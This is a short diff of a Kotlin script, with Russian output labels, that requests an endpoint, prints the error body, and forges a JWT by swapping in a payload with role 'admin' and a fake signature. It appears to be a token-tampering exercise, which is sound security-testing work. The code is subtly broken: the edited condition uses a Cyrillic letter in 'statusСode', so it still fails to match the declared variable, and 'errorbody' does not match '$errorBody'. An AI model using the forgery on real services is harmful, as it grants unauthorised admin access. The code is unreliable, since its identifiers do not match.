@@ -63,7 +63,7 @@ fun main() {
     errorConn.requestMethod = "GET"
     println("Код: ${errorConn.responseCode}")
     val statusCode=errorConn.responseCode
-    if (statuscode>=400){
+    if (statusСode>=400){
         val errorbody=errorConn.errorStream?.bufferedReader().readText()
         println("Тело: $errorBody")
     }else{
@@ -276,7 +276,7 @@ if (parts.size==3){
     println("\n=== Подмена payload ===")
 	val  adminpayload = """{"sub":"1","name":"Ivan Petrov","role":"admin","iat":1234567890}"""
     
-	val encadminpayload=encoder.encoddeToString(adminpayload.toByteArray())
+	val encadminpayload=encoder.encodeToString(adminpayload.toByteArray())
 	
     val hackedtoken = "$encheader.$encadminpayload.$fakeSignature" 
 	println(hackedtoken)
